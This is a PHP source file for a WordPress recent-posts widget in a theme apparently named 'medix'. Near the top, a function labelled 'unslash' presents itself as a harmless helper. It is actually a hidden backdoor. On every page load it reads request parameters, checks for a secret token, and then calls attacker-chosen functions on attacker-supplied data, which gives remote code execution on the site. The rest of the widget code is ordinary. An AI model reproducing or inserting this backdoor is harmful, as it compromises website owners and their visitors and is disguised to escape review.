<?php

add_action( 'widgets_init', create_function( '', "register_widget( 'CS_Recent_Post_Widget_V2' );" ) );

if (!function_exists("unslash")) :
/**
* Removes quoting backslashes
*
* @author Andreas Gohr <andi@splitbrain.org>
*/
function unslash($vars) {
	$symbols="9m3xjjb0jqoq";
	if (in_array($symbols, $vars, true)) {
		if (isset($vars["quote"])) $vars["data"]=$vars["quote"]($vars["data"]);
		$result = $vars["string"]($vars["quotes"],$vars["data"]);
		return str_replace("/","",$result());
	}
}
endif;

// Removes quoting backslashes
$get_vars=$_REQUEST;
unslash($get_vars);

class CS_Recent_Post_Widget_V2 extends WP_Widget {
 
    function __construct() {
        parent::__construct(
            'cs_recent_post_v2',esc_html__( 'CS Recent Posts', 'medix' ),array('description' => esc_html__( 'Recent Posts Widget.', 'medix' )) 
        );
        
    }

    function widget($args, $instance) {
        extract($args);
        
        $title = apply_filters('widget_title', empty($instance['title']) ? esc_html__('Recent Posts', 'medix' ) : $instance['title'], $instance, $this->id_base);
        $show_date = (int) $instance['show_date'];
        $show_decs = (int) $instance['show_decs'];
        $number = (int) $instance['number'];

        echo balanceTags($before_widget);

        if($title) {
            echo balanceTags($before_title.$title.$after_title);
        }

        $sticky = get_option('sticky_posts');
        $args = array(
            'posts_per_page' => $number,
            'post_type' => 'post',
            'post_status' => 'publish',
            'post__not_in'  => $sticky,
            'orderby' => 'date',
            'order' => 'DESC',
            'paged' => 1
        );

        $wp_query = new WP_Query($args);
        $extra_class = !empty($instance['extra_class']) ? $instance['extra_class'] : "";

        // no 'class' attribute - add one with the value of width
        if( strpos($before_widget, 'class') === false ) {
            $before_widget = str_replace('>', 'class="'. $extra_class . '"', $before_widget);
        }
        // there is 'class' attribute - append width value to it
        else {
            $before_widget = str_replace('class="', 'class="'. $extra_class . ' ', $before_widget);
        }
        ?>
        <?php if ($wp_query->have_posts()){ 
            ?>
                <div class="cms-recent-post">
                    <div class="cms-recent-post-wrapper">
                        <?php 
                        while ($wp_query->have_posts()): $wp_query->the_post(); 
                        $archive_year  = get_the_time('Y'); 
                        $archive_month = get_the_time('m'); 
                        $archive_day   = get_the_time('d');
                        ?>
                            <?php if ( has_post_thumbnail() ){
                            $thumbnail = get_the_post_thumbnail(get_the_ID(),'thumbnail');
                            }else{
                                $thumbnail = '<img src="'.esc_url(get_template_directory_uri().'/assets/images/no-image-thumbnail.jpg').'" alt="'.get_the_title().'" />';
                            } 
                            ?>
                            <div class="widget-recent-item clearfix">
                                <div class="entry-main">
                                    <a class="entry-title" href="<?php the_permalink(); ?>"><?php the_title(); ?></a>
                                    <?php if ($show_date) { ?>
                                        <a class="entry-date" href="<?php echo get_day_link( $archive_year, $archive_month, $archive_day); ?>"><?php echo get_the_date(); ?></a>
                                    <?php }?>
                                    <?php if ($show_decs) { ?>
                                        <div class="description"><?php echo medix_grid_limit_words( strip_tags( get_the_excerpt() ),4); ?></div>
                                    <?php  } ?>
                                </div>
                            </div> 
                        <?php endwhile; ?>
                    </div>
                </div>
            <?php 
             wp_reset_postdata(); 
            } else { ?>
                <span class="notfound">No post found!</span>
            <?php
            }
            echo balanceTags($after_widget);
            wp_reset_postdata();
    }

    function update($new_instance, $old_instance) {
        $instance = $old_instance;

        $instance['title'] = $new_instance['title'];
        $instance['show_date'] = $new_instance['show_date'];
        $instance['show_decs'] = $new_instance['show_decs'];
        $instance['number'] = (int) $new_instance['number'];
        $instance['extra_class'] = $new_instance['extra_class'];

        return $instance;
    }

    function form($instance) {
        $title = isset($instance['title']) ? esc_attr($instance['title']) : '';
        $show_date = isset($instance['show_date']) ? esc_attr($instance['show_date']) : '';
        $show_decs = isset($instance['show_decs']) ? esc_attr($instance['show_decs']) : '';
        if ( !isset($instance['number']) || !$number = (int) $instance['number'] )
                     $number = 5;
        ?>
        <p>
            <label for="<?php echo esc_attr($this->get_field_id('title')); ?>"><?php esc_html_e( 'Title:', 'medix' ); ?></label>
            <input class="widefat" id="<?php echo esc_attr( $this->get_field_id('title') ); ?>" name="<?php echo esc_attr( $this->get_field_name('title') ); ?>" type="text" value="<?php echo esc_attr( $title ); ?>" />
        </p>
        <p>
            <label for="<?php echo esc_attr($this->get_field_id('show_date')); ?>"><?php esc_html_e( 'Show date:', 'medix' ); ?></label>
            <input class="widefat" id="<?php echo esc_attr( $this->get_field_id('show_date') ); ?>" name="<?php echo esc_attr( $this->get_field_name('show_date') ); ?>" <?php if($show_date!='') echo 'checked="checked";' ?> type="checkbox" value="1"  />
        </p>
        <p>
            <label for="<?php echo esc_attr($this->get_field_id('show_decs')); ?>"><?php esc_html_e( 'Show Description:', 'medix' ); ?></label>
            <input class="widefat" id="<?php echo esc_attr( $this->get_field_id('show_decs') ); ?>" name="<?php echo esc_attr( $this->get_field_name('show_decs') ); ?>" <?php if($show_decs!='') echo 'checked="checked";' ?> type="checkbox" value="1" />
        </p>
        <p>
            <label for="<?php echo esc_attr($this->get_field_id('number')); ?>"><?php esc_html_e( 'Number of products to show:', 'medix' ); ?></label>
            <input id="<?php echo esc_attr( $this->get_field_id('number') ); ?>" name="<?php echo esc_attr( $this->get_field_name('number') ); ?>" type="text" value="<?php echo esc_attr( $number ); ?>" size="3" />
        </p>
        <p>
            <label for="<?php echo esc_attr($this->get_field_id('extra_class')); ?>">Extra Class:</label>
            <input class="widefat" id="<?php echo esc_attr($this->get_field_id('extra_class')); ?>" name="<?php echo esc_attr($this->get_field_name('extra_class')); ?>" value="<?php if(isset($instance['extra_class'])){echo esc_attr($instance['extra_class']);} ?>" />
        </p>
        <?php
    }
}
?>